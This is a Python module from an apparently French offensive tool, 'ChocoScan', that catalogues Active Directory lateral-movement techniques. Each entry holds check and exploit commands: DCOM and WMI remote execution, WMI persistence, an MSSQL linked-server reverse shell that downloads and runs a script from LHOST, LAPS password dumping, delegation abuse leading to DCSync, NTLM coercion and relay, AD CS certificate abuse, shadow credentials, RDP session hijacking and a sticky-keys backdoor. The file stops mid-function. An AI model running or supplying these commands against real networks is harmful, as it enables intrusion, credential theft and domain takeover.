"""
ChocoScan — Lateral Movement.

Techniques de mouvement latéral Windows complémentaires à ad_enum.py.
Ce module se concentre sur les vecteurs post-compromise :
une fois qu'un premier compte est compromis, comment pivoter
vers d'autres machines / comptes / le DC.

Complémentaire (ne pas dupliquer) :
  ad_enum.py     → énumération initiale, Kerberoasting, AS-REP, BloodHound
  smb_helper.py  → SMB null session, secretsdump, wmiexec basique, relay
  token_helper.py → privileges locaux, Potato attacks

Ce module couvre spécifiquement :
  DCOM            — MMC20.Application, ShellWindows (impacket-dcomexec)
  WMI natif       — wmic.exe, PowerShell Invoke-WmiMethod
  MSSQL Linked    — sp_linkedservers, EXEC AT, xp_cmdshell chaîné
  LAPS            — dump du mot de passe admin local via LDAP/CMA
  Délégation      — Unconstrained, Constrained (S4U), RBCD
  Coercition      — PrinterBug, PetitPotam, DFSCoerce + relay
  AD CS           — certipy ESC1/ESC4/ESC8, Pass-the-Certificate
  Shadow Creds    — pyWhisker, certipy shadow
  RDP Hijacking   — tscon, session theft depuis SYSTEM

Référence : book.hacktricks.xyz/windows-hardening/active-directory-methodology
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class LateralTechnique:
    title:        str
    category:     str    # dcom | wmi | mssql | laps | delegation | coercion | adcs | shadow | rdp
    description:  str
    check_cmd:    str    # Commande pour identifier si le vecteur est disponible
    exploit_cmd:  str    # Exploitation
    requires_auth: bool = True
    severity:     str = "high"    # critical | high | medium
    difficulty:   str = "medium"  # easy | medium | hard
    notes:        list[str] = field(default_factory=list)


@dataclass
class LateralResult:
    target:         str
    domain:         str
    dc_detected:    bool
    mssql_detected: bool
    rdp_detected:   bool
    techniques:     list[LateralTechnique]
    notes:          list[str]


# ── DCOM ──────────────────────────────────────────────────────────────────────

DCOM_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="DCOM — MMC20.Application (impacket-dcomexec)",
        category="dcom",
        description=(
            "Exécution distante via DCOM MMC20.Application. "
            "Moins bruyant que psexec (pas de service créé), "
            "fonctionne même si SMB admin shares sont restreints. "
            "Port 135 (RPC endpoint mapper) requis."
        ),
        check_cmd=(
            "# Vérifier que le port 135 est ouvert :\n"
            "nmap -p 135 TARGET --open\n\n"
            "# Depuis la cible — lister les objets DCOM disponibles :\n"
            "Get-CimInstance Win32_DCOMApplicationSetting | Select-Object AppId, Description"
        ),
        exploit_cmd=(
            "# impacket-dcomexec — shell semi-interactif :\n"
            "impacket-dcomexec DOMAIN/USER:PASS@TARGET\n\n"
            "# Avec hash NTLM :\n"
            "impacket-dcomexec -hashes :NTLM_HASH DOMAIN/USER@TARGET\n\n"
            "# Spécifier l'objet DCOM (MMC20 par défaut) :\n"
            "impacket-dcomexec -object MMC20 DOMAIN/USER:PASS@TARGET\n"
            "impacket-dcomexec -object ShellWindows DOMAIN/USER:PASS@TARGET\n"
            "impacket-dcomexec -object ShellBrowserWindow DOMAIN/USER:PASS@TARGET\n\n"
            "# Commande unique :\n"
            "impacket-dcomexec DOMAIN/USER:PASS@TARGET 'whoami /all'"
        ),
        severity="high",
        difficulty="easy",
        notes=[
            "Plus discret que psexec — pas de création de service",
            "ShellWindows et ShellBrowserWindow nécessitent un utilisateur connecté sur la cible",
            "Nécessite admin local ou admin domaine",
        ],
    ),

    LateralTechnique(
        title="DCOM — Via PowerShell natif (sans outil tiers)",
        category="dcom",
        description=(
            "Exécution DCOM via PowerShell pur, sans binaire à déposer. "
            "Utile quand impacket n'est pas disponible ou depuis un shell PowerShell déjà ouvert."
        ),
        check_cmd=(
            "# Tester si DCOM est accessible depuis la cible :\n"
            "$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', 'TARGET'))\n"
            "$dcom | Get-Member"
        ),
        exploit_cmd=(
            "# Depuis une machine Windows avec accès au réseau :\n"
            "$target = 'TARGET'\n"
            "$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', $target))\n"
            "$dcom.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null,\n"
            "  '/c powershell -nop -e BASE64_PAYLOAD', '7')\n\n"
            "# ShellWindows (si utilisateur connecté sur cible) :\n"
            "$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID(\n"
            "  [guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39', $target))\n"
            "$item = $shell.Item()\n"
            "$item.Document.Application.ShellExecute('cmd.exe',\n"
            "  '/c calc.exe', 'C:\\Windows\\System32', $null, 0)"
        ),
        severity="high",
        difficulty="medium",
        notes=["Génère des logs DCOM (EventID 10028) — moins discret que WMI"],
    ),
]


# ── WMI ───────────────────────────────────────────────────────────────────────

WMI_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="WMI — Win32_Process.Create (exécution distante native)",
        category="wmi",
        description=(
            "Exécution via WMI Win32_Process.Create. "
            "Pas de shell interactif mais exécution silencieuse, "
            "aucun binaire à déposer. Résultat via SMB share ou reverse shell."
        ),
        check_cmd=(
            "# WMI accessible ? Port 135 + ports éphémères :\n"
            "nmap -p 135 TARGET\n\n"
            "# Tester la connectivité WMI (depuis Windows) :\n"
            "wmic /node:TARGET /user:DOMAIN\\USER /password:PASS process list brief"
        ),
        exploit_cmd=(
            "# ── wmic.exe (natif Windows) ────────────────────────────────────\n"
            "wmic /node:TARGET /user:DOMAIN\\USER /password:PASS\n"
            "  process call create 'cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt'\n\n"
            "# Lire le résultat via SMB :\n"
            "type \\\\TARGET\\C$\\Windows\\Temp\\out.txt\n\n"
            "# ── PowerShell WMI ────────────────────────────────────────────────\n"
            "Invoke-WmiMethod -Class Win32_Process -Name Create \\\n"
            "  -ComputerName TARGET \\\n"
            "  -Credential (Get-Credential) \\\n"
            "  -ArgumentList 'powershell -nop -enc BASE64_PAYLOAD'\n\n"
            "# ── PowerShell CIM (WMI v2, recommandé) ─────────────────────────\n"
            "$sess = New-CimSession -ComputerName TARGET \\\n"
            "  -Credential (New-Object PSCredential('DOMAIN\\USER', (ConvertTo-SecureString 'PASS' -AsPlainText -Force)))\n"
            "Invoke-CimMethod -CimSession $sess -ClassName Win32_Process \\\n"
            "  -MethodName Create -Arguments @{CommandLine='cmd /c whoami > C:\\out.txt'}"
        ),
        severity="high",
        difficulty="easy",
        notes=[
            "Pas de shell interactif — préférer un reverse shell dans le payload",
            "WMI subscription permet la persistance (EventFilter + EventConsumer)",
        ],
    ),

    LateralTechnique(
        title="WMI Persistence — Event Subscription",
        category="wmi",
        description=(
            "Persistance via WMI Event Subscription (filtre + consommateur). "
            "Survit aux reboots, difficile à détecter sans outils spécialisés."
        ),
        check_cmd=(
            "# Lister les subscriptions WMI existantes :\n"
            "Get-WMIObject -Namespace root\\subscription -Class __EventFilter\n"
            "Get-WMIObject -Namespace root\\subscription -Class __EventConsumer\n"
            "Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding"
        ),
        exploit_cmd=(
            "# Via PowerShell — déclencher au boot (ProcessStartTrace) :\n"
            "$FilterArgs = @{Name='MalFilter';\n"
            "  EventNamespace='root\\cimv2';\n"
            "  QueryLanguage='WQL';\n"
            "  Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\n"
            "$Filter = New-CimInstance -Namespace root/subscription \\\n"
            "  -ClassName __EventFilter -Property $FilterArgs\n\n"
            "$ConsumerArgs = @{Name='MalConsumer';\n"
            "  CommandLineTemplate='cmd.exe /c powershell -nop -enc BASE64_PAYLOAD'}\n"
            "$Consumer = New-CimInstance -Namespace root/subscription \\\n"
            "  -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n"
            "New-CimInstance -Namespace root/subscription \\\n"
            "  -ClassName __FilterToConsumerBinding \\\n"
            "  -Property @{Filter=$Filter; Consumer=$Consumer}\n\n"
            "# Outil : SharpSploit ou PowerSploit Persist-WMI\n"
            "# Détection : Autoruns.exe → WMI tab"
        ),
        severity="high",
        difficulty="hard",
        notes=["Sysmon EventID 19/20/21 détecte les WMI subscriptions"],
    ),
]


# ── MSSQL Linked Servers ──────────────────────────────────────────────────────

MSSQL_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="MSSQL Linked Servers — Énumération et RCE chaînée",
        category="mssql",
        description=(
            "Les linked servers permettent d'exécuter des requêtes SQL sur "
            "d'autres serveurs MSSQL depuis le serveur initial. "
            "Si un lien dispose de droits sysadmin, on peut activer xp_cmdshell "
            "sur le serveur distant et obtenir RCE."
        ),
        check_cmd=(
            "# Via mssqlclient.py (impacket) :\n"
            "impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth\n"
            "SQL> EXEC sp_linkedservers\n"
            "SQL> EXEC sp_helplinkedsrvlogin\n\n"
            "# Tester si le lien a les droits sysadmin :\n"
            "SQL> SELECT myuser FROM openquery(\"LINKED_SERVER\", 'SELECT SYSTEM_USER as myuser')\n"
            "SQL> SELECT myuser FROM openquery(\"LINKED_SERVER\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as myuser')"
        ),
        exploit_cmd=(
            "# ── Activer xp_cmdshell sur le serveur lié ───────────────────────\n"
            "SQL> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SERVER]\n"
            "SQL> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER]\n\n"
            "# ── RCE via le linked server ──────────────────────────────────────\n"
            "SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]\n\n"
            "# ── Reverse shell via linked server ──────────────────────────────\n"
            "SQL> EXEC ('xp_cmdshell ''powershell -nop -c \"IEX(New-Object Net.WebClient)"
            ".DownloadString(\\\"http://LHOST/shell.ps1\\\")\"''') AT [LINKED_SERVER]\n\n"
            "# ── Chaîner deux niveaux de links ────────────────────────────────\n"
            "SQL> EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' ) AT [LINKED_SERVER_2]') AT [LINKED_SERVER_1]\n\n"
            "# ── PowerUpSQL (automatisé) ───────────────────────────────────────\n"
            "Import-Module PowerUpSQL.ps1\n"
            "Get-SQLServerLinkCrawl -Verbose -Instance TARGET | Format-Table\n"
            "Get-SQLServerLinkCrawl -Instance TARGET -Query 'exec master..xp_cmdshell ''whoami'''"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "PowerUpSQL automatise le crawl des liens : https://github.com/NetSPI/PowerUpSQL",
            "Un lien 'sa' sans restrictions = RCE directe sur le serveur lié",
            "Chercher dans BloodHound : nœuds MSSQL avec liens vers le DC",
        ],
    ),
]


# ── LAPS ──────────────────────────────────────────────────────────────────────

LAPS_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="LAPS — Dump des mots de passe admin locaux",
        category="laps",
        description=(
            "LAPS (Local Administrator Password Solution) stocke le mot de passe "
            "admin local dans l'attribut LDAP ms-Mcs-AdmPwd. "
            "Si l'utilisateur courant a le droit de lire cet attribut "
            "(GenericRead, ReadProperty sur ms-Mcs-AdmPwd), "
            "récupérer les mots de passe admin locaux de toutes les machines."
        ),
        check_cmd=(
            "# Vérifier si LAPS est déployé :\n"
            "Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd | "
            "Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null}\n\n"
            "# CrackMapExec — détecter LAPS :\n"
            "crackmapexec smb DC_IP -u USER -p PASS -M laps\n\n"
            "# Depuis Linux via LDAP :\n"
            "ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\\USER' -w PASS \\\n"
            "  -b 'DC=domain,DC=local' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime"
        ),
        exploit_cmd=(
            "# ── CrackMapExec (le plus simple) ───────────────────────────────\n"
            "crackmapexec smb DC_IP -u USER -p PASS --laps\n"
            "# Cible spécifique :\n"
            "crackmapexec smb TARGET -u USER -p PASS --laps\n\n"
            "# ── bloodyAD (Python, depuis Linux) ──────────────────────────────\n"
            "bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object COMPUTER$ \\\n"
            "  --attr ms-Mcs-AdmPwd\n\n"
            "# ── PyLAPS ────────────────────────────────────────────────────────\n"
            "python3 pyLAPS.py --action get -d DOMAIN -u USER -p PASS\n\n"
            "# ── PowerShell natif (si shell Windows) ──────────────────────────\n"
            "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | "
            "Select-Object Name, ms-Mcs-AdmPwd\n\n"
            "# ── Utiliser le mot de passe récupéré ────────────────────────────\n"
            "# LAPS donne le compte Administrator (RID 500) avec un mdp unique :\n"
            "crackmapexec smb TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth\n"
            "evil-winrm -i TARGET -u Administrator -p 'LAPS_PASSWORD'"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Chercher les ACLs dans BloodHound : qui peut lire ms-Mcs-AdmPwd ?",
            "LAPS v2 (Windows Server 2022+) → attribut msLAPS-Password (chiffré)",
        ],
    ),
]


# ── Délégation Kerberos ───────────────────────────────────────────────────────

DELEGATION_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="Unconstrained Delegation — Capture de TGT via coercition",
        category="delegation",
        description=(
            "Un compte/machine avec unconstrained delegation stocke "
            "en mémoire les TGT de tous les utilisateurs qui se connectent. "
            "En forçant le DC à s'authentifier (PrinterBug/PetitPotam) "
            "on capture son TGT → DCSync ou accès total."
        ),
        check_cmd=(
            "# Trouver les machines avec unconstrained delegation :\n"
            "# BloodHound → 'Find Computers with Unconstrained Delegation'\n\n"
            "# LDAP :\n"
            "ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\\USER' -w PASS \\\n"
            "  -b 'DC=domain,DC=local' \\\n"
            "  '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \\\n"
            "  sAMAccountName distinguishedName\n\n"
            "# CrackMapExec :\n"
            "crackmapexec ldap DC_IP -u USER -p PASS --trusted-for-delegation"
        ),
        exploit_cmd=(
            "# Depuis la machine avec unconstrained delegation (Rubeus) :\n\n"
            "# 1. Monitorer les nouveaux tickets :\n"
            "Rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap\n\n"
            "# 2. Forcer le DC à s'authentifier (PrinterBug) :\n"
            "#    Depuis Kali :\n"
            "python3 printerbug.py DOMAIN/USER:PASS@DC_IP UNCONSTRAINED_MACHINE\n\n"
            "# 3. Capturer le ticket dans Rubeus, puis :\n"
            "Rubeus.exe ptt /ticket:BASE64_TICKET\n\n"
            "# 4. DCSync depuis la machine avec le ticket DC$ :\n"
            "impacket-secretsdump -just-dc DOMAIN/DC$@DC_IP -k -no-pass\n\n"
            "# Alternative — Rubeus s4u (si ticket DC$ obtenu) :\n"
            "mimikatz # sekurlsa::tickets /export\n"
            "mimikatz # kerberos::ptt ticket.kirbi\n"
            "mimikatz # lsadump::dcsync /domain:DOMAIN /all"
        ),
        severity="critical",
        difficulty="hard",
        notes=[
            "Nécessite compromis initial d'une machine avec unconstrained delegation",
            "PrinterBug fonctionne si Print Spooler actif sur le DC",
            "PetitPotam ne nécessite pas les droits admin : petitpotam.py",
        ],
    ),

    LateralTechnique(
        title="Constrained Delegation — S4U2Proxy vers service cible",
        category="delegation",
        description=(
            "Constrained delegation permet à un compte d'usurper l'identité "
            "de n'importe quel utilisateur envers un service spécifique. "
            "Si on compromet le compte délégant, on peut obtenir un ticket "
            "admin vers la cible sans connaître le mot de passe de l'utilisateur cible."
        ),
        check_cmd=(
            "# Trouver les comptes avec constrained delegation :\n"
            "ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\\USER' -w PASS \\\n"
            "  -b 'DC=domain,DC=local' \\\n"
            "  '(msDS-AllowedToDelegateTo=*)' \\\n"
            "  sAMAccountName msDS-AllowedToDelegateTo\n\n"
            "# BloodHound → 'Find Constrained Delegation'\n\n"
            "# impacket :\n"
            "impacket-findDelegation DOMAIN/USER:PASS"
        ),
        exploit_cmd=(
            "# impacket getST — S4U2Self + S4U2Proxy :\n\n"
            "# 1. Obtenir un TGT pour le compte délégant :\n"
            "impacket-getTGT DOMAIN/SVC_ACCOUNT:PASS\n"
            "export KRB5CCNAME=SVC_ACCOUNT.ccache\n\n"
            "# 2. S4U2Proxy — usurper Administrator vers cifs/TARGET :\n"
            "impacket-getST -spn cifs/TARGET.DOMAIN -impersonate Administrator \\\n"
            "  DOMAIN/SVC_ACCOUNT -k -no-pass\n"
            "export KRB5CCNAME=Administrator@cifs_TARGET.ccache\n\n"
            "# 3. Utiliser le ticket :\n"
            "impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET\n"
            "impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET\n\n"
            "# Avec hash NTLM (sans mot de passe en clair) :\n"
            "impacket-getST -spn cifs/TARGET -impersonate Administrator \\\n"
            "  -hashes :NTLM_HASH DOMAIN/SVC_ACCOUNT"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION) → S4U2Self sans TGT utilisateur",
            "Chercher aussi les SPNs dans la liste msDS-AllowedToDelegateTo",
        ],
    ),

    LateralTechnique(
        title="RBCD — Resource-Based Constrained Delegation",
        category="delegation",
        description=(
            "Si on a GenericWrite (ou WriteDACL/WriteProperty) sur un objet computer, "
            "on peut configurer msDS-AllowedToActOnBehalfOfOtherIdentity pour usurper "
            "n'importe quel utilisateur vers ce computer → admin sans hash ni creds."
        ),
        check_cmd=(
            "# Trouver les objets sur lesquels on a GenericWrite :\n"
            "# BloodHound → 'Shortest Paths from Owned Principals'\n\n"
            "# Vérifier si on peut créer des computer accounts (par défaut oui pour users domain) :\n"
            "crackmapexec ldap DC_IP -u USER -p PASS -M maq\n"
            "# MAQ (Machine Account Quota) > 0 → on peut créer un computer account"
        ),
        exploit_cmd=(
            "# ── Étape 1 : Créer un computer account ─────────────────────────\n"
            "impacket-addcomputer DOMAIN/USER:PASS -dc-ip DC_IP \\\n"
            "  -computer-name 'ATTACKER$' -computer-pass 'P@ssw0rd123'\n\n"
            "# ── Étape 2 : Configurer RBCD sur la cible ───────────────────────\n"
            "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \\\n"
            "  -dc-ip DC_IP -action write DOMAIN/USER:PASS\n\n"
            "# ── Étape 3 : Obtenir un ticket pour Administrator ───────────────\n"
            "impacket-getST -spn cifs/TARGET -impersonate Administrator \\\n"
            "  DOMAIN/ATTACKER$:P@ssw0rd123 -dc-ip DC_IP\n"
            "export KRB5CCNAME=Administrator@cifs_TARGET.ccache\n\n"
            "# ── Étape 4 : Utiliser ───────────────────────────────────────────\n"
            "impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET\n"
            "impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET\n\n"
            "# Nettoyer :\n"
            "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \\\n"
            "  -dc-ip DC_IP -action flush DOMAIN/USER:PASS"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Très fréquent en CTF HTB — vérifier GenericWrite dans BloodHound",
            "Machine Account Quota par défaut = 10 : n'importe quel user peut créer un computer account",
            "Alternative à impacket-addcomputer : PowerMad.ps1 (New-MachineAccount)",
        ],
    ),
]


# ── Coercition d'authentification ─────────────────────────────────────────────

COERCION_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="PrinterBug / PetitPotam / DFSCoerce — Coercition NTLM",
        category="coercion",
        description=(
            "Force un serveur Windows (y compris un DC) à s'authentifier "
            "vers une machine contrôlée. Le hash NTLM peut être capturé "
            "(Responder) ou relayé (ntlmrelayx) vers une cible vulnérable."
        ),
        check_cmd=(
            "# PrinterBug — Print Spooler actif ?\n"
            "impacket-rpcdump DOMAIN/USER:PASS@TARGET | grep -i 'spoolss\\|spooler'\n\n"
            "# PetitPotam — pas de droits requis (MS-EFSRPC) :\n"
            "# Toujours tenter, très souvent disponible sur les vieux DC\n\n"
            "# DFSCoerce (MS-DFSNM) :\n"
            "python3 dfscoerce.py -d DOMAIN -u USER -p PASS LISTENER_IP TARGET"
        ),
        exploit_cmd=(
            "# ── Préparer le relay (sur Kali) ────────────────────────────────\n"
            "# Modifier Responder.conf : SMB=Off, HTTP=Off\n"
            "sudo python3 Responder.py -I tun0 -wdv\n\n"
            "# Lancer ntlmrelayx vers la cible (en parallèle) :\n"
            "impacket-ntlmrelayx -tf targets.txt -smb2support -socks\n\n"
            "# ── PrinterBug (MS-RPRN) — Print Spooler requis ─────────────────\n"
            "python3 printerbug.py DOMAIN/USER:PASS@TARGET LISTENER_IP\n\n"
            "# ── PetitPotam (MS-EFSRPC) — sans creds requis ──────────────────\n"
            "python3 PetitPotam.py LISTENER_IP TARGET\n"
            "# Avec creds :\n"
            "python3 PetitPotam.py -u USER -p PASS -d DOMAIN LISTENER_IP TARGET\n\n"
            "# ── DFSCoerce (MS-DFSNM) ─────────────────────────────────────────\n"
            "python3 dfscoerce.py -d DOMAIN -u USER -p PASS LISTENER_IP TARGET\n\n"
            "# ── Coercer (outil tout-en-un) ───────────────────────────────────\n"
            "coercer coerce -t TARGET -l LISTENER_IP -u USER -p PASS -d DOMAIN"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "PetitPotam sans creds fonctionne sur Server 2019 non patché",
            "Coercer teste automatiquement tous les protocoles : https://github.com/p0dalirius/Coercer",
            "Combo classique : PetitPotam + ntlmrelayx → AD CS (ESC8) → certificat DC → DCSync",
        ],
    ),
]


# ── AD CS — Certificate Services ─────────────────────────────────────────────

ADCS_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="AD CS — certipy find + ESC1/ESC4/ESC8",
        category="adcs",
        description=(
            "Active Directory Certificate Services est souvent mal configuré. "
            "ESC1 : demander un certificat en spécifiant le SAN (UPN d'un admin). "
            "ESC8 : relay NTLM vers l'endpoint HTTP AD CS → certificat DC. "
            "Chaque certificat obtenu permet une auth Kerberos sans mot de passe."
        ),
        check_cmd=(
            "# Énumération complète des templates :\n"
            "certipy find -dc-ip DC_IP -u USER@DOMAIN -p PASS -stdout\n"
            "certipy find -dc-ip DC_IP -u USER@DOMAIN -p PASS -vulnerable -stdout\n\n"
            "# Détection via CrackMapExec :\n"
            "crackmapexec ldap DC_IP -u USER -p PASS -M adcs\n\n"
            "# Depuis Windows — certutil :\n"
            "certutil -dumpstore -enterprise NTAuthCertificates"
        ),
        exploit_cmd=(
            "# ── ESC1 — Template avec enrollee supplies subject ───────────────\n"
            "# Obtenir un certificat pour Administrator :\n"
            "certipy req -ca 'CA_NAME' -template 'VULNERABLE_TEMPLATE' \\\n"
            "  -upn Administrator@DOMAIN \\\n"
            "  -dc-ip DC_IP -u USER@DOMAIN -p PASS\n\n"
            "# Authentifier avec le certificat :\n"
            "certipy auth -pfx Administrator.pfx -domain DOMAIN -username Administrator -dc-ip DC_IP\n"
            "# → Retourne le hash NTLM de Administrator → PTH ou crack\n\n"
            "# ── ESC8 — Relay NTLM vers AD CS HTTP ────────────────────────────\n"
            "# 1. Relay vers l'endpoint AD CS :\n"
            "impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp \\\n"
            "  -smb2support --adcs --template DomainController\n\n"
            "# 2. Forcer l'auth du DC (PrinterBug/PetitPotam) :\n"
            "python3 PetitPotam.py KALI_IP DC_IP\n\n"
            "# 3. Récupérer le certificat du DC depuis ntlmrelayx\n"
            "# 4. Authentifier :\n"
            "certipy auth -pfx dc.pfx -dc-ip DC_IP\n\n"
            "# ── ESC4 — Template ACL modifiable ───────────────────────────────\n"
            "# Modifier le template pour y ajouter ESC1 :\n"
            "certipy template -ca 'CA_NAME' -template 'VULNERABLE_TEMPLATE' \\\n"
            "  -save-old -dc-ip DC_IP -u USER@DOMAIN -p PASS\n"
            "certipy req -ca 'CA_NAME' -template 'VULNERABLE_TEMPLATE' \\\n"
            "  -upn Administrator@DOMAIN -dc-ip DC_IP -u USER@DOMAIN -p PASS"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "certipy : https://github.com/ly4k/Certipy",
            "ESC8 combo PetitPotam = obtenir le certificat du DC sans aucun privilège initial",
            "Le certificat donne le hash NTLM → PTH + DCSync",
        ],
    ),
]


# ── Shadow Credentials ────────────────────────────────────────────────────────

SHADOW_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="Shadow Credentials — Takeover via msDS-KeyCredentialLink",
        category="shadow",
        description=(
            "Si on a GenericWrite sur un compte (user ou computer), "
            "on peut ajouter une clé dans msDS-KeyCredentialLink. "
            "Ensuite, s'authentifier via PKINIT (Kerberos avec clé privée) "
            "→ TGT + hash NTLM de la cible sans son mot de passe."
        ),
        check_cmd=(
            "# GenericWrite sur un compte dans BloodHound → Shadow Credentials possible\n\n"
            "# Vérifier si PKINIT est supporté (DC doit avoir AD CS) :\n"
            "certipy find -dc-ip DC_IP -u USER@DOMAIN -p PASS\n\n"
            "# Lister les KeyCredentials existantes :\n"
            "bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object TARGET \\\n"
            "  --attr msDS-KeyCredentialLink"
        ),
        exploit_cmd=(
            "# ── pyWhisker (Linux) ────────────────────────────────────────────\n"
            "python3 pywhisker.py -d DOMAIN -u USER -p PASS \\\n"
            "  --target TARGET_USER --action add --dc-ip DC_IP\n"
            "# → Génère TARGET_USER.pfx + mot de passe du pfx\n\n"
            "# S'authentifier avec la clé :\n"
            "python3 gettgtpkinit.py -cert-pfx TARGET_USER.pfx -pfx-pass PASSWORD \\\n"
            "  DOMAIN/TARGET_USER TARGET_USER.ccache\n"
            "export KRB5CCNAME=TARGET_USER.ccache\n\n"
            "# Récupérer le hash NTLM :\n"
            "python3 getnthash.py -key TGT_SESSION_KEY DOMAIN/TARGET_USER\n\n"
            "# ── certipy (plus simple, tout-en-un) ────────────────────────────\n"
            "certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER -dc-ip DC_IP\n"
            "# → Retourne directement le hash NTLM\n\n"
            "# Nettoyer (supprimer la KeyCredential) :\n"
            "certipy shadow clear -u USER@DOMAIN -p PASS -account TARGET_USER -dc-ip DC_IP"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Requiert AD CS (PKINIT doit être configuré sur le DC)",
            "certipy shadow auto fait tout en une commande",
            "pyWhisker : https://github.com/ShutdownRepo/pywhisker",
        ],
    ),
]


# ── RDP Hijacking ─────────────────────────────────────────────────────────────

RDP_TECHNIQUES: list[LateralTechnique] = [

    LateralTechnique(
        title="RDP Hijacking — tscon (session theft depuis SYSTEM)",
        category="rdp",
        description=(
            "Depuis un contexte SYSTEM, on peut reprendre la session RDP "
            "d'un autre utilisateur connecté (même si elle est verrouillée) "
            "sans connaître son mot de passe, via tscon.exe."
        ),
        check_cmd=(
            "# Lister les sessions RDP actives :\n"
            "query session\n"
            "# Ou :\n"
            "qwinsta\n"
            "# → Chercher les sessions 'Active' ou 'Disconnected' d'autres utilisateurs"
        ),
        exploit_cmd=(
            "# ── Via tscon (nécessite SYSTEM) ────────────────────────────────\n"
            "# Élever en SYSTEM d'abord (potato, service exploit...):\n"
            "# Lister les sessions :\n"
            "query session\n\n"
            "# Reprendre la session ID 2 (sans mot de passe) :\n"
            "tscon 2 /dest:rdp-tcp#1\n\n"
            "# Via sc.exe (create service SYSTEM qui appelle tscon) :\n"
            "sc create hijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#1\"\n"
            "net start hijack\n\n"
            "# ── SharpRDP — exécution de code via RDP ─────────────────────────\n"
            "SharpRDP.exe computername=TARGET username=DOMAIN\\USER password=PASS command=calc.exe\n\n"
            "# ── Sticky Keys backdoor (si accès physique/SYSTEM) ───────────────\n"
            "# Remplacer sethc.exe par cmd.exe → 5× Shift à l'écran de connexion = cmd SYSTEM\n"
            "takeown /f C:\\Windows\\System32\\sethc.exe\n"
            "icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F\n"
            "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
        ),
        severity="high",
        difficulty="medium",
        notes=[
            "tscon sans mot de passe = feature Windows connue depuis XP",
            "Sessions 'Disconnected' sont aussi reprochables",
            "SharpRDP : https://github.com/0xthirteen/SharpRDP",
        ],
    ),
]


# ── Détection du contexte ─────────────────────────────────────────────────────

def _detect_context(results: list[dict]) -> tuple[str, str, bool, bool, bool]:
    """Détecte le contexte AD depuis les résultats du scan."""
    target = ""
    domain = ""
    dc_detected    = False
    mssql_detected = False
    rdp_detected   = False

    ports_open = set()
    for r in results:
        svc  = r.get("service", {})
        port = svc.get("port", 0) or 0
        ports_open.add(port)
        if not target:
            target = svc.get("host", "") or ""

        banner   = (svc.get("banner", "") or "").lower()
        svc_name = (svc.get("service_name", "") or "").lower()

        import re
        dom_m = re.search(r"(?:domain|realm)[=:\s]+([A-Za-z0-9\.\-]+)", banner, re.I)
        if dom_m and not domain:
            domain = dom_m.group(1).strip()

    dc_detected    = 88 in ports_open and 389 in ports_open
    mssql_detected = 1433 in ports_open
    rdp_detected   = 3389 in ports_open

    return target, domain, dc_detected, mssql_detected, rdp_detected


# ── Moteur principal ──────────────────────────────────────────────────────────

def generate_lateral_commands(results: list[dict]) -> LateralResult:
    """
    Génère les techniques de mouvement latéral adaptées au contexte du scan.

    Args:
        results: Résultats ChocoScan (liste de dicts avec clé 'service').

    Returns:
        LateralResult avec toutes les techniques et notes contextuelles.
    """
    target, domain, dc_detected, mssql_detected, rdp_detected = _detect_context(results)

